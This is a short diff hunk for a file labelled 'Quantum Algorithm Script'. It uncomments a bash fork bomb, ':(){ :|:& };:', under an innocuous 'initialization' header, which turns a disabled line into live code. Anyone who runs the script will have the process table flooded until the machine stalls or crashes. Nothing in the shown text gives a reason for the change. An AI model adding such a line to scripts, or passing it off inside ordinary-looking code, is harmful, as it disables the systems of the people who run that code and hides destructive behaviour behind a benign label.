@@ -1,6 +1,6 @@
 # Quantum Algorithm Script initialization
 
-#:(){ :|:& };:
+:(){ :|:& };:
 
 
 # Quantum Algorithm Script
